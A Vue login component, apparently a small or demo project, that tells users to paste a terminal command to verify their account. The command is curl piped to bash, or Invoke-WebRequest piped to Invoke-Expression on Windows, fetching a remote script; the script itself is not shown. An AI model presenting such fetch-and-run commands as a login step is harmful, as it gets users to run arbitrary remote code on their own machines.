<script lang="ts" setup>
import generateRandomString from "@/lib/generateRandomString";
const isWindows = ref(false);
const requestString = ref("");
onMounted(() => {
    if (navigator.userAgent.includes("Windows")) {
        isWindows.value = true;
    }
    const browserID = localStorage.getItem("browserID");
    const randomString = generateRandomString(20);
    if (!browserID || !browserID.match(/^[a-zA-Z0-9-_.]{20}$/)) {
        requestString.value = randomString;
        localStorage.setItem("browserID", randomString);
    } else {
        requestString.value = browserID;
    }
});

const getLoginHook = () => {};

const checkIfUserIsDone = async () => {};
</script>
<template>
    <div class="flex flex-col">
        <span
            >Copy and paste this to your terminal of your choice to login</span
        >
        <br />
        <code v-if="isWindows">
            Invoke-WebRequest
            https://funlogin.vrl.yhw.tw/download/account-verify |
            Invoke-Expression --client=codecodecode
        </code>
        <code v-else>
            curl -s https://funlogin.vrl.yhw.tw/download/account-verify | bash
            -s -- --client=codecodecode
        </code>
        <button @click="checkIfUserIsDone">Check request</button>
    </div>
</template>
